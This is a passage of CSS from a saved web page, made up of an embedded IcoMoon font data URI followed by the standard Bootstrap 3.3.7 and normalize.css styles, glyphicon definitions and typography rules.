BEgQAAKQEAAAXA%2F8AMAQAAHMEAABDBAAASAQPAAEEAADFBAABAAQAABgEAABRBAAAIAQAAGEEAABlBAAAYQQAAFQEAABOBAAAgAQdABADDABIBAAA%2FgQAAFIEAABWBAAAVQQAAFEEAABRBAAAfAVhAB0EAAHIBAAB%2FQQAAkwEAABTBAAByAQAAscEAALHBAABAgQAAFYEAABGBAAATAQAAFYEAABPBJYA%2BARpAD4EAABgBAAAVQQAAE8EAABoAAAAAAAKABQAHgBuAVoBhAGuAgACpgLmAyADYgSiBMQFYAXiBzAHsgguCJgJWAnwCmgK9gvEDGgMwg1yDl4OxA%2BQEEIQzhHgE44VbhaSGLAZThpCGzAceB4KHuIgLCFqIiwjWiRSJQYlwCbIJ7Qolik2KdIqHDBYMJQwwDIyM840IDS6NVA15De4OCg4ljkWOWw6FDqkOwY73DyMPWo%2BSD%2FgQRRB%2FENyRM5FbkYiRqJHgEgCSLpJYkowSyJMYEzYTTZNXk1%2BTdZOVk9cUAJQrlEUUW5RtFHMUeJSiFKWUqRSslPCVEZUdlUMVjJWfFa0WNhY5lnMWhZbNgAAAAEAAAB8BMcAQwAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAOAK4AAQAAAAAAAQAHAAAAAQAAAAAAAgAHAGAAAQAAAAAAAwAHADYAAQAAAAAABAAHAHUAAQAAAAAABQALABUAAQAAAAAABgAHAEsAAQAAAAAACgAaAIoAAwABBAkAAQAOAAcAAwABBAkAAgAOAGcAAwABBAkAAwAOAD0AAwABBAkABAAOAHwAAwABBAkABQAWACAAAwABBAkABgAOAFIAAwABBAkACgA0AKRpY29tb29uAGkAYwBvAG0AbwBvAG5WZXJzaW9uIDEuMABWAGUAcgBzAGkAbwBuACAAMQAuADBpY29tb29uAGkAYwBvAG0AbwBvAG5pY29tb29uAGkAYwBvAG0AbwBvAG5SZWd1bGFyAFIAZQBnAHUAbABhAHJpY29tb29uAGkAYwBvAG0AbwBvAG5Gb250IGdlbmVyYXRlZCBieSBJY29Nb29uLgBGAG8AbgB0ACAAZwBlAG4AZQByAGEAdABlAGQAIABiAHkAIABJAGMAbwBNAG8AbwBuAC4AAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)
                    format("woff");
            } /*!
 * Bootstrap v3.3.7 (http://getbootstrap.com)
 * Copyright 2011-2016 Twitter, Inc.
 * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
 */ /*! normalize.css v3.0.3 | MIT License | github.com/necolas/normalize.css */
            html {
                font-family: sans-serif;
                -ms-text-size-adjust: 100%;
                -webkit-text-size-adjust: 100%;
            }
            body {
                margin: 0;
            }
            article,
            aside,
            details,
            figcaption,
            figure,
            footer,
            header,
            hgroup,
            main,
            menu,
            nav,
            section,
            summary {
                display: block;
            }
            audio,
            canvas,
            progress,
            video {
                display: inline-block;
                vertical-align: baseline;
            }
            audio:not([controls]) {
                display: none;
                height: 0;
            }
            [hidden],
            template {
                display: none;
            }
            a {
                background-color: transparent;
            }
            a:active,
            a:hover {
                outline: 0;
            }
            abbr[title] {
                border-bottom: 1px dotted;
            }
            b,
            strong {
                font-weight: bold;
            }
            dfn {
                font-style: italic;
            }
            h1 {
                font-size: 2em;
                margin: 0.67em 0;
            }
            mark {
                background: #ff0;
                color: #000;
            }
            small {
                font-size: 80%;
            }
            sub,
            sup {
                font-size: 75%;
                line-height: 0;
                position: relative;
                vertical-align: baseline;
            }
            sup {
                top: -0.5em;
            }
            sub {
                bottom: -0.25em;
            }
            img {
                border: 0;
            }
            svg:not(:root) {
                overflow: hidden;
            }
            figure {
                margin: 1em 40px;
            }
            hr {
                box-sizing: content-box;
                height: 0;
            }
            pre {
                overflow: auto;
            }
            code,
            kbd,
            pre,
            samp {
                font-family: monospace, monospace;
                font-size: 1em;
            }
            button,
            input,
            optgroup,
            select,
            textarea {
                color: inherit;
                font: inherit;
                margin: 0;
            }
            button {
                overflow: visible;
            }
            button,
            select {
                text-transform: none;
            }
            button,
            html input[type="button"],
            input[type="reset"],
            input[type="submit"] {
                -webkit-appearance: button;
                cursor: pointer;
            }
            button[disabled],
            html input[disabled] {
                cursor: default;
            }
            button::-moz-focus-inner,
            input::-moz-focus-inner {
                border: 0;
                padding: 0;
            }
            input {
                line-height: normal;
            }
            input[type="checkbox"],
            input[type="radio"] {
                box-sizing: border-box;
                padding: 0;
            }
            input[type="number"]::-webkit-inner-spin-button,
            input[type="number"]::-webkit-outer-spin-button {
                height: auto;
            }
            input[type="search"] {
                -webkit-appearance: textfield;
                box-sizing: content-box;
            }
            input[type="search"]::-webkit-search-cancel-button,
            input[type="search"]::-webkit-search-decoration {
                -webkit-appearance: none;
            }
            fieldset {
                border: 1px solid #c0c0c0;
                margin: 0 2px;
                padding: 0.35em 0.625em 0.75em;
            }
            legend {
                border: 0;
                padding: 0;
            }
            textarea {
                overflow: auto;
            }
            optgroup {
                font-weight: bold;
            }
            table {
                border-collapse: collapse;
                border-spacing: 0;
            }
            td,
            th {
                padding: 0;
            } /*! Source: https://github.com/h5bp/html5-boilerplate/blob/master/src/css/main.css */
            @media print {
                *,
                *:before,
                *:after {
                    background: transparent !important;
                    color: #000 !important;
                    box-shadow: none !important;
                    text-shadow: none !important;
                }
                a,
                a:visited {
                    text-decoration: underline;
                }
                a[href]:after {
                    content: " (" attr(href) ")";
                }
                abbr[title]:after {
                    content: " (" attr(title) ")";
                }
                a[href^="#"]:after,
                a[href^="javascript:"]:after {
                    content: "";
                }
                pre,
                blockquote {
                    border: 1px solid #999;
                    page-break-inside: avoid;
                }
                thead {
                    display: table-header-group;
                }
                tr,
                img {
                    page-break-inside: avoid;
                }
                img {
                    max-width: 100% !important;
                }
                p,
                h2,
                h3 {
                    orphans: 3;
                    widows: 3;
                }
                h2,
                h3 {
                    page-break-after: avoid;
                }
                .navbar {
                    display: none;
                }
                .btn > .caret,
                .dropup > .btn > .caret {
                    border-top-color: #000 !important;
                }
                .label {
                    border: 1px solid #000;
                }
                .table {
                    border-collapse: collapse !important;
                }
                .table td,
                .table th {
                    background-color: #fff !important;
                }
                .table-bordered th,
                .table-bordered td {
                    border: 1px solid #ddd !important;
                }
            }
            @font-face {
                font-family: "Glyphicons Halflings";
                src:/*savepage-url=../fonts/bootstrap/glyphicons-halflings-regular.eot*/ url();
                src:/*savepage-url=../fonts/bootstrap/glyphicons-halflings-regular.eot?#iefix*/ url() format("embedded-opentype"), /*savepage-url=../fonts/bootstrap/glyphicons-halflings-regular.woff2*/ url() format("woff2"),
                    /*savepage-url=../fonts/bootstrap/glyphicons-halflings-regular.woff*/ url() format("woff"), /*savepage-url=../fonts/bootstrap/glyphicons-halflings-regular.ttf*/ url() format("truetype"),
                    /*savepage-url=../fonts/bootstrap/glyphicons-halflings-regular.svg#glyphicons_halflingsregular*/ url() format("svg");
            }
            .glyphicon {
                position: relative;
                top: 1px;
                display: inline-block;
                font-family: "Glyphicons Halflings";
                font-style: normal;
                font-weight: normal;
                line-height: 1;
                -webkit-font-smoothing: antialiased;
                -moz-osx-font-smoothing: grayscale;
            }
            .glyphicon-asterisk:before {
                content: "\002a";
            }
            .glyphicon-plus:before {
                content: "\002b";
            }
            .glyphicon-euro:before,
            .glyphicon-eur:before {
                content: "\20ac";
            }
            .glyphicon-minus:before {
                content: "\2212";
            }
            .glyphicon-cloud:before {
                content: "\2601";
            }
            .glyphicon-envelope:before {
                content: "\2709";
            }
            .glyphicon-pencil:before {
                content: "\270f";
            }
            .glyphicon-glass:before {
                content: "\e001";
            }
            .glyphicon-music:before {
                content: "\e002";
            }
            .glyphicon-search:before {
                content: "\e003";
            }
            .glyphicon-heart:before {
                content: "\e005";
            }
            .glyphicon-star:before {
                content: "\e006";
            }
            .glyphicon-star-empty:before {
                content: "\e007";
            }
            .glyphicon-user:before {
                content: "\e008";
            }
            .glyphicon-film:before {
                content: "\e009";
            }
            .glyphicon-th-large:before {
                content: "\e010";
            }
            .glyphicon-th:before {
                content: "\e011";
            }
            .glyphicon-th-list:before {
                content: "\e012";
            }
            .glyphicon-ok:before {
                content: "\e013";
            }
            .glyphicon-remove:before {
                content: "\e014";
            }
            .glyphicon-zoom-in:before {
                content: "\e015";
            }
            .glyphicon-zoom-out:before {
                content: "\e016";
            }
            .glyphicon-off:before {
                content: "\e017";
            }
            .glyphicon-signal:before {
                content: "\e018";
            }
            .glyphicon-cog:before {
                content: "\e019";
            }
            .glyphicon-trash:before {
                content: "\e020";
            }
            .glyphicon-home:before {
                content: "\e021";
            }
            .glyphicon-file:before {
                content: "\e022";
            }
            .glyphicon-time:before {
                content: "\e023";
            }
            .glyphicon-road:before {
                content: "\e024";
            }
            .glyphicon-download-alt:before {
                content: "\e025";
            }
            .glyphicon-download:before {
                content: "\e026";
            }
            .glyphicon-upload:before {
                content: "\e027";
            }
            .glyphicon-inbox:before {
                content: "\e028";
            }
            .glyphicon-play-circle:before {
                content: "\e029";
            }
            .glyphicon-repeat:before {
                content: "\e030";
            }
            .glyphicon-refresh:before {
                content: "\e031";
            }
            .glyphicon-list-alt:before {
                content: "\e032";
            }
            .glyphicon-lock:before {
                content: "\e033";
            }
            .glyphicon-flag:before {
                content: "\e034";
            }
            .glyphicon-headphones:before {
                content: "\e035";
            }
            .glyphicon-volume-off:before {
                content: "\e036";
            }
            .glyphicon-volume-down:before {
                content: "\e037";
            }
            .glyphicon-volume-up:before {
                content: "\e038";
            }
            .glyphicon-qrcode:before {
                content: "\e039";
            }
            .glyphicon-barcode:before {
                content: "\e040";
            }
            .glyphicon-tag:before {
                content: "\e041";
            }
            .glyphicon-tags:before {
                content: "\e042";
            }
            .glyphicon-book:before {
                content: "\e043";
            }
            .glyphicon-bookmark:before {
                content: "\e044";
            }
            .glyphicon-print:before {
                content: "\e045";
            }
            .glyphicon-camera:before {
                content: "\e046";
            }
            .glyphicon-font:before {
                content: "\e047";
            }
            .glyphicon-bold:before {
                content: "\e048";
            }
            .glyphicon-italic:before {
                content: "\e049";
            }
            .glyphicon-text-height:before {
                content: "\e050";
            }
            .glyphicon-text-width:before {
                content: "\e051";
            }
            .glyphicon-align-left:before {
                content: "\e052";
            }
            .glyphicon-align-center:before {
                content: "\e053";
            }
            .glyphicon-align-right:before {
                content: "\e054";
            }
            .glyphicon-align-justify:before {
                content: "\e055";
            }
            .glyphicon-list:before {
                content: "\e056";
            }
            .glyphicon-indent-left:before {
                content: "\e057";
            }
            .glyphicon-indent-right:before {
                content: "\e058";
            }
            .glyphicon-facetime-video:before {
                content: "\e059";
            }
            .glyphicon-picture:before {
                content: "\e060";
            }
            .glyphicon-map-marker:before {
                content: "\e062";
            }
            .glyphicon-adjust:before {
                content: "\e063";
            }
            .glyphicon-tint:before {
                content: "\e064";
            }
            .glyphicon-edit:before {
                content: "\e065";
            }
            .glyphicon-share:before {
                content: "\e066";
            }
            .glyphicon-check:before {
                content: "\e067";
            }
            .glyphicon-move:before {
                content: "\e068";
            }
            .glyphicon-step-backward:before {
                content: "\e069";
            }
            .glyphicon-fast-backward:before {
                content: "\e070";
            }
            .glyphicon-backward:before {
                content: "\e071";
            }
            .glyphicon-play:before {
                content: "\e072";
            }
            .glyphicon-pause:before {
                content: "\e073";
            }
            .glyphicon-stop:before {
                content: "\e074";
            }
            .glyphicon-forward:before {
                content: "\e075";
            }
            .glyphicon-fast-forward:before {
                content: "\e076";
            }
            .glyphicon-step-forward:before {
                content: "\e077";
            }
            .glyphicon-eject:before {
                content: "\e078";
            }
            .glyphicon-chevron-left:before {
                content: "\e079";
            }
            .glyphicon-chevron-right:before {
                content: "\e080";
            }
            .glyphicon-plus-sign:before {
                content: "\e081";
            }
            .glyphicon-minus-sign:before {
                content: "\e082";
            }
            .glyphicon-remove-sign:before {
                content: "\e083";
            }
            .glyphicon-ok-sign:before {
                content: "\e084";
            }
            .glyphicon-question-sign:before {
                content: "\e085";
            }
            .glyphicon-info-sign:before {
                content: "\e086";
            }
            .glyphicon-screenshot:before {
                content: "\e087";
            }
            .glyphicon-remove-circle:before {
                content: "\e088";
            }
            .glyphicon-ok-circle:before {
                content: "\e089";
            }
            .glyphicon-ban-circle:before {
                content: "\e090";
            }
            .glyphicon-arrow-left:before {
                content: "\e091";
            }
            .glyphicon-arrow-right:before {
                content: "\e092";
            }
            .glyphicon-arrow-up:before {
                content: "\e093";
            }
            .glyphicon-arrow-down:before {
                content: "\e094";
            }
            .glyphicon-share-alt:before {
                content: "\e095";
            }
            .glyphicon-resize-full:before {
                content: "\e096";
            }
            .glyphicon-resize-small:before {
                content: "\e097";
            }
            .glyphicon-exclamation-sign:before {
                content: "\e101";
            }
            .glyphicon-gift:before {
                content: "\e102";
            }
            .glyphicon-leaf:before {
                content: "\e103";
            }
            .glyphicon-fire:before {
                content: "\e104";
            }
            .glyphicon-eye-open:before {
                content: "\e105";
            }
            .glyphicon-eye-close:before {
                content: "\e106";
            }
            .glyphicon-warning-sign:before {
                content: "\e107";
            }
            .glyphicon-plane:before {
                content: "\e108";
            }
            .glyphicon-calendar:before {
                content: "\e109";
            }
            .glyphicon-random:before {
                content: "\e110";
            }
            .glyphicon-comment:before {
                content: "\e111";
            }
            .glyphicon-magnet:before {
                content: "\e112";
            }
            .glyphicon-chevron-up:before {
                content: "\e113";
            }
            .glyphicon-chevron-down:before {
                content: "\e114";
            }
            .glyphicon-retweet:before {
                content: "\e115";
            }
            .glyphicon-shopping-cart:before {
                content: "\e116";
            }
            .glyphicon-folder-close:before {
                content: "\e117";
            }
            .glyphicon-folder-open:before {
                content: "\e118";
            }
            .glyphicon-resize-vertical:before {
                content: "\e119";
            }
            .glyphicon-resize-horizontal:before {
                content: "\e120";
            }
            .glyphicon-hdd:before {
                content: "\e121";
            }
            .glyphicon-bullhorn:before {
                content: "\e122";
            }
            .glyphicon-bell:before {
                content: "\e123";
            }
            .glyphicon-certificate:before {
                content: "\e124";
            }
            .glyphicon-thumbs-up:before {
                content: "\e125";
            }
            .glyphicon-thumbs-down:before {
                content: "\e126";
            }
            .glyphicon-hand-right:before {
                content: "\e127";
            }
            .glyphicon-hand-left:before {
                content: "\e128";
            }
            .glyphicon-hand-up:before {
                content: "\e129";
            }
            .glyphicon-hand-down:before {
                content: "\e130";
            }
            .glyphicon-circle-arrow-right:before {
                content: "\e131";
            }
            .glyphicon-circle-arrow-left:before {
                content: "\e132";
            }
            .glyphicon-circle-arrow-up:before {
                content: "\e133";
            }
            .glyphicon-circle-arrow-down:before {
                content: "\e134";
            }
            .glyphicon-globe:before {
                content: "\e135";
            }
            .glyphicon-wrench:before {
                content: "\e136";
            }
            .glyphicon-tasks:before {
                content: "\e137";
            }
            .glyphicon-filter:before {
                content: "\e138";
            }
            .glyphicon-briefcase:before {
                content: "\e139";
            }
            .glyphicon-fullscreen:before {
                content: "\e140";
            }
            .glyphicon-dashboard:before {
                content: "\e141";
            }
            .glyphicon-paperclip:before {
                content: "\e142";
            }
            .glyphicon-heart-empty:before {
                content: "\e143";
            }
            .glyphicon-link:before {
                content: "\e144";
            }
            .glyphicon-phone:before {
                content: "\e145";
            }
            .glyphicon-pushpin:before {
                content: "\e146";
            }
            .glyphicon-usd:before {
                content: "\e148";
            }
            .glyphicon-gbp:before {
                content: "\e149";
            }
            .glyphicon-sort:before {
                content: "\e150";
            }
            .glyphicon-sort-by-alphabet:before {
                content: "\e151";
            }
            .glyphicon-sort-by-alphabet-alt:before {
                content: "\e152";
            }
            .glyphicon-sort-by-order:before {
                content: "\e153";
            }
            .glyphicon-sort-by-order-alt:before {
                content: "\e154";
            }
            .glyphicon-sort-by-attributes:before {
                content: "\e155";
            }
            .glyphicon-sort-by-attributes-alt:before {
                content: "\e156";
            }
            .glyphicon-unchecked:before {
                content: "\e157";
            }
            .glyphicon-expand:before {
                content: "\e158";
            }
            .glyphicon-collapse-down:before {
                content: "\e159";
            }
            .glyphicon-collapse-up:before {
                content: "\e160";
            }
            .glyphicon-log-in:before {
                content: "\e161";
            }
            .glyphicon-flash:before {
                content: "\e162";
            }
            .glyphicon-log-out:before {
                content: "\e163";
            }
            .glyphicon-new-window:before {
                content: "\e164";
            }
            .glyphicon-record:before {
                content: "\e165";
            }
            .glyphicon-save:before {
                content: "\e166";
            }
            .glyphicon-open:before {
                content: "\e167";
            }
            .glyphicon-saved:before {
                content: "\e168";
            }
            .glyphicon-import:before {
                content: "\e169";
            }
            .glyphicon-export:before {
                content: "\e170";
            }
            .glyphicon-send:before {
                content: "\e171";
            }
            .glyphicon-floppy-disk:before {
                content: "\e172";
            }
            .glyphicon-floppy-saved:before {
                content: "\e173";
            }
            .glyphicon-floppy-remove:before {
                content: "\e174";
            }
            .glyphicon-floppy-save:before {
                content: "\e175";
            }
            .glyphicon-floppy-open:before {
                content: "\e176";
            }
            .glyphicon-credit-card:before {
                content: "\e177";
            }
            .glyphicon-transfer:before {
                content: "\e178";
            }
            .glyphicon-cutlery:before {
                content: "\e179";
            }
            .glyphicon-header:before {
                content: "\e180";
            }
            .glyphicon-compressed:before {
                content: "\e181";
            }
            .glyphicon-earphone:before {
                content: "\e182";
            }
            .glyphicon-phone-alt:before {
                content: "\e183";
            }
            .glyphicon-tower:before {
                content: "\e184";
            }
            .glyphicon-stats:before {
                content: "\e185";
            }
            .glyphicon-sd-video:before {
                content: "\e186";
            }
            .glyphicon-hd-video:before {
                content: "\e187";
            }
            .glyphicon-subtitles:before {
                content: "\e188";
            }
            .glyphicon-sound-stereo:before {
                content: "\e189";
            }
            .glyphicon-sound-dolby:before {
                content: "\e190";
            }
            .glyphicon-sound-5-1:before {
                content: "\e191";
            }
            .glyphicon-sound-6-1:before {
                content: "\e192";
            }
            .glyphicon-sound-7-1:before {
                content: "\e193";
            }
            .glyphicon-copyright-mark:before {
                content: "\e194";
            }
            .glyphicon-registration-mark:before {
                content: "\e195";
            }
            .glyphicon-cloud-download:before {
                content: "\e197";
            }
            .glyphicon-cloud-upload:before {
                content: "\e198";
            }
            .glyphicon-tree-conifer:before {
                content: "\e199";
            }
            .glyphicon-tree-deciduous:before {
                content: "\e200";
            }
            .glyphicon-cd:before {
                content: "\e201";
            }
            .glyphicon-save-file:before {
                content: "\e202";
            }
            .glyphicon-open-file:before {
                content: "\e203";
            }
            .glyphicon-level-up:before {
                content: "\e204";
            }
            .glyphicon-copy:before {
                content: "\e205";
            }
            .glyphicon-paste:before {
                content: "\e206";
            }
            .glyphicon-alert:before {
                content: "\e209";
            }
            .glyphicon-equalizer:before {
                content: "\e210";
            }
            .glyphicon-king:before {
                content: "\e211";
            }
            .glyphicon-queen:before {
                content: "\e212";
            }
            .glyphicon-pawn:before {
                content: "\e213";
            }
            .glyphicon-bishop:before {
                content: "\e214";
            }
            .glyphicon-knight:before {
                content: "\e215";
            }
            .glyphicon-baby-formula:before {
                content: "\e216";
            }
            .glyphicon-tent:before {
                content: "\26fa";
            }
            .glyphicon-blackboard:before {
                content: "\e218";
            }
            .glyphicon-bed:before {
                content: "\e219";
            }
            .glyphicon-apple:before {
                content: "\f8ff";
            }
            .glyphicon-erase:before {
                content: "\e221";
            }
            .glyphicon-hourglass:before {
                content: "\231b";
            }
            .glyphicon-lamp:before {
                content: "\e223";
            }
            .glyphicon-duplicate:before {
                content: "\e224";
            }
            .glyphicon-piggy-bank:before {
                content: "\e225";
            }
            .glyphicon-scissors:before {
                content: "\e226";
            }
            .glyphicon-bitcoin:before {
                content: "\e227";
            }
            .glyphicon-btc:before {
                content: "\e227";
            }
            .glyphicon-xbt:before {
                content: "\e227";
            }
            .glyphicon-yen:before {
                content: "\00a5";
            }
            .glyphicon-jpy:before {
                content: "\00a5";
            }
            .glyphicon-ruble:before {
                content: "\20bd";
            }
            .glyphicon-rub:before {
                content: "\20bd";
            }
            .glyphicon-scale:before {
                content: "\e230";
            }
            .glyphicon-ice-lolly:before {
                content: "\e231";
            }
            .glyphicon-ice-lolly-tasted:before {
                content: "\e232";
            }
            .glyphicon-education:before {
                content: "\e233";
            }
            .glyphicon-option-horizontal:before {
                content: "\e234";
            }
            .glyphicon-option-vertical:before {
                content: "\e235";
            }
            .glyphicon-menu-hamburger:before {
                content: "\e236";
            }
            .glyphicon-modal-window:before {
                content: "\e237";
            }
            .glyphicon-oil:before {
                content: "\e238";
            }
            .glyphicon-grain:before {
                content: "\e239";
            }
            .glyphicon-sunglasses:before {
                content: "\e240";
            }
            .glyphicon-text-size:before {
                content: "\e241";
            }
            .glyphicon-text-color:before {
                content: "\e242";
            }
            .glyphicon-text-background:before {
                content: "\e243";
            }
            .glyphicon-object-align-top:before {
                content: "\e244";
            }
            .glyphicon-object-align-bottom:before {
                content: "\e245";
            }
            .glyphicon-object-align-horizontal:before {
                content: "\e246";
            }
            .glyphicon-object-align-left:before {
                content: "\e247";
            }
            .glyphicon-object-align-vertical:before {
                content: "\e248";
            }
            .glyphicon-object-align-right:before {
                content: "\e249";
            }
            .glyphicon-triangle-right:before {
                content: "\e250";
            }
            .glyphicon-triangle-left:before {
                content: "\e251";
            }
            .glyphicon-triangle-bottom:before {
                content: "\e252";
            }
            .glyphicon-triangle-top:before {
                content: "\e253";
            }
            .glyphicon-console:before {
                content: "\e254";
            }
            .glyphicon-superscript:before {
                content: "\e255";
            }
            .glyphicon-subscript:before {
                content: "\e256";
            }
            .glyphicon-menu-left:before {
                content: "\e257";
            }
            .glyphicon-menu-right:before {
                content: "\e258";
            }
            .glyphicon-menu-down:before {
                content: "\e259";
            }
            .glyphicon-menu-up:before {
                content: "\e260";
            }
            * {
                -webkit-box-sizing: border-box;
                -moz-box-sizing: border-box;
                box-sizing: border-box;
            }
            *:before,
            *:after {
                -webkit-box-sizing: border-box;
                -moz-box-sizing: border-box;
                box-sizing: border-box;
            }
            html {
                font-size: 10px;
                -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
            }
            body {
                font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
                font-size: 14px;
                line-height: 1.428571429;
                color: #333333;
                background-color: #fff;
            }
            input,
            button,
            select,
            textarea {
                font-family: inherit;
                font-size: inherit;
                line-height: inherit;
            }
            a {
                color: #337ab7;
                text-decoration: none;
            }
            a:hover,
            a:focus {
                color: #23527c;
                text-decoration: underline;
            }
            a:focus {
                outline: 5px auto -webkit-focus-ring-color;
                outline-offset: -2px;
            }
            figure {
                margin: 0;
            }
            img {
                vertical-align: middle;
            }
            .img-responsive {
                display: block;
                max-width: 100%;
                height: auto;
            }
            .img-rounded {
                border-radius: 6px;
            }
            .img-thumbnail {
                padding: 4px;
                line-height: 1.428571429;
                background-color: #fff;
                border: 1px solid #ddd;
                border-radius: 4px;
                -webkit-transition: all 0.2s ease-in-out;
                -o-transition: all 0.2s ease-in-out;
                transition: all 0.2s ease-in-out;
                display: inline-block;
                max-width: 100%;
                height: auto;
            }
            .img-circle {
                border-radius: 50%;
            }
            hr {
                margin-top: 20px;
                margin-bottom: 20px;
                border: 0;
                border-top: 1px solid #eeeeee;
            }
            .sr-only {
                position: absolute;
                width: 1px;
                height: 1px;
                margin: -1px;
                padding: 0;
                overflow: hidden;
                clip: rect(0, 0, 0, 0);
                border: 0;
            }
            .sr-only-focusable:active,
            .sr-only-focusable:focus {
                position: static;
                width: auto;
                height: auto;
                margin: 0;
                overflow: visible;
                clip: auto;
            }
            [role="button"] {
                cursor: pointer;
            }
            h1,
            h2,
            h3,
            h4,
            h5,
            h6,
            .h1,
            .h2,
            .h3,
            .h4,
            .h5,
            .h6 {
                font-family: inherit;
                font-weight: 500;
                line-height: 1.1;
                color: inherit;
            }
            h1 small,
            h1 .small,
            h2 small,
            h2 .small,
            h3 small,
            h3 .small,
            h4 small,
            h4 .small,
            h5 small,
            h5 .small,
            h6 small,
            h6 .small,
            .h1 small,
            .h1 .small,
            .h2 small,
            .h2 .small,
            .h3 small,
            .h3 .small,
            .h4 small,
            .h4 .small,
            .h5 small,
            .h5 .small,
            .h6 small,
            .h6 .small {
                font-weight: normal;
                line-height: 1;
                color: #777777;
            }
            h1,
            .h1,
            h2,
            .h2,
            h3,
            .h3 {
                margin-top: 20px;
                margin-bottom: 10px;
            }
            h1 small,
            h1 .small,
            .h1 small,
            .h1 .small,
            h2 small,
            h2 .small,
            .h2 small,
            .h2 .small,
            h3 small,
            h3 .small,
            .h3 small,
            .h3 .small {
                font-size: 65%;
            }
            h4,
            .h4,
            h5,
            .h5,
            h6,
            .h6 {
                margin-top: 10px;
                margin-bottom: 10px;
            }
            h4 small,
            h4 .small,
            .h4 small,
            .h4 .small,
            h5 small,
            h5 .small,
            .h5 small,
            .h5 .small,
            h6 small,
            h6 .small,
            .h6 small,
            .h6 .small {
                font-size: 75%;
            }
            h1,
            .h1 {
                font-size: 36px;
            }
            h2,
            .h2 {
                font-size: 30px;
            }
            h3,
            .h3 {
                font-size: 24px;
            }
            h4,
            .h4 {
                font-size: 18px;
            }
            h5,
            .h5 {
                font-size: 14px;
            }
            h6,
            .h6 {
                font-size: 12px;
            }
            p {
                margin: 0 0 10px;
            }
            .lead {
                margin-bottom: 20px;
                font-size: 16px;
                font-weight: 300;
                line-height: 1.4;
            }
            @media (min-width: 768px) {
                .lead {
                    font-size: 21px;
                }
            }
            small,
            .small {
                font-size: 85%;
            }
            mark,
            .mark {
                background-color: #fcf8e3;
                padding: 0.2em;
            }
            .text-left {
                text-align: left;
            }
            .text-right {
                text-align: right;
            }
            .text-center {
                text-align: center;
            }
            .text-justify {
                text-align: justify;
            }
            .text-nowrap {
                white-space: nowrap;
            }
            .text-lowercase {
                text-transform: lowercase;
            }
            .text-uppercase,
            .initialism {
                text-transform: uppercase;
            }
            .text-capitalize {
                text-transform: capitalize;
            }
            .text-muted {
                color: #777777;
            }
            .text-primary {
                color: #337ab7;
            }
            a.text-primary:hover,
            a.text-primary:focus {
                color: #286090;
            }
            .text-success {
                color: #3c763d;
            }
            a.text-success:hover,
            a.text-success:focus {
                color: #2b542c;
            }
            .text-info {
                color: #31708f;
            }
            a.text-info:hover,
            a.text-info:focus {
                color: #245269;
            }
            .text-warning {
                color: #8a6d3b;
            }
            a.text-warning:hover,
            a.text-warning:focus {
                color: #66512c;
            }
            .text-danger {
                color: #a94442;
            }
            a.text-danger:hover,
            a.text-danger:focus {
                color: #843534;
            }
            .bg-primary {
                color: #fff;
            }
            .bg-primary {
                background-color: #337ab7;
            }
            a.bg-primary:hover,
            a.bg-primary:focus {
                background-color: #286090;
            }
            .bg-success {
                background-color: #dff0d8;
            }
            a.bg-success:hover,
            a.bg-success:focus {
                background-color: #c1e2b3;
            }
            .bg-info {
                background-color: #d9edf7;
            }
            a.bg-info:hover,
            a.bg-info:focus {
                background-color: #afd9ee;
            }
            .bg-warning {
                background-color: #fcf8e3;
            }
            a.bg-warning:hover,
            a.bg-warning:focus {
                background-color: #f7ecb5;
            }
            .bg-danger {
                background-color: #f2dede;
            }
            a.bg-danger:hover,
            a.bg-danger:focus {
                background-color: #e4b9b9;
            }
            .page-header {
                padding-bottom: 9px;
                margin: 40px 0 20px;
                border-bottom: 1px solid #eeeeee;
            }
            ul,
            ol {
                margin-top: 0;
                margin-bottom: 10px;
            }
            ul ul,
            ul ol,
            ol ul,
            ol ol {
                margin-bottom: 0;
            }
            .list-unstyled {
                padding-left: 0;
                list-style: none;
            }
            .list-inline {
                padding-left: 0;
                list-style: none;
                margin-left: -5px;
            }
            .list-inline > li {
                display: inline-block;
                padding-left: 5px;
                padding-right: 5px;
            }
            dl {
                margin-top: 0;
                margin-bottom: 20px;
            }
            dt,
            dd {
                line-height: 1.428571429;
            }
            dt {
                font-weight: bold;
            }
            dd {
                margin-left: 0;
            }
            .dl-horizontal dd:before,
            .dl-horizontal dd:after {
                content: " ";
                display: table;
            }
            .dl-horizontal dd:after {
                clear: both;
            }
            @media (min-width: 768px) {
                .dl-horizontal dt {
                    float: left;
                    width: 160px;
                    clear: left;
                    text-align: right;
                    overflow: hidden;
                    text-overflow: ellipsis;
                    white-space: nowrap;
                }
                .dl-horizontal dd {
                    margin-left: 180px;
                }
            }
            abbr[title],
            abbr[data-original-title] {
                cursor: help;
                border-bottom: 1px dotted #777777;
            }
            .initialism {
                font-size: 90%;
            }
            blockquote {
                padding: 10px 20px;
                margin: 0 0 20px;
                font-size: 17.5px;
                border-left: 5px solid #eeeeee;
            }
            blockquote p:last-child,
            blockquote ul:last-child,
            blockquote ol:last-child {
                margin-bottom: 0;
            }
            blockquote footer,
            blockquote small,
            blockquote .small {
                display: block;
                font-size: 80%;
                line-height: 1.428571429;
                color: #777777;
            }
            blockquote footer:before,
            blockquote small:before,
            blockquote .small:before {
                content: "\2014 \00A0";
            }
            .blockquote-reverse,
            blockquote.pull-right {
                padding-right: 15px;
                padding-left: 0;
                border-right: 5px solid #eeeeee;
                border-left: 0;
                text-align: right;
            }
            .blockquote-reverse footer:before,
            .blockquote-reverse small:before,
            .blockquote-reverse .small:before,
            blockquote.pull-right footer:before,
            blockquote.pull-right small:before,
            blockquote.pull-right .small:before {
                content: "";
            }
            .blockquote-reverse footer:after,
            .blockquote-reverse small:after,
            .blockquote-reverse .small:after,
            blockquote.pull-right footer:after,
            blockquote.pull-right small:after,
            blockquote.pull-right .small:after {
                content: "\00A0 \2014";
            }
            address {
                margin-bottom: 20px;
                font-style: normal;
                line-height: 1.428571429;
            }
            code,
            kbd,
            pre,
            samp {
                font-family: Menlo, Monaco, Consolas, "Courier New", monospace;
            }
            code {
                padding: 2px 4px;
                font-size: 90%;
                color: #c7254e;
                background-color: #f9f2f4;
                border-radius: 4px;
            }
            kbd {
                padding: 2px 4px;
                font-size: 90%;
                color: #fff;
                background-color: #333;
                border-radius: 3px;
                box-shadow: inset 0 -1px 0 rgba(0, 0, 0, 0.25);
            }
            kbd kbd {
                padding: 0;
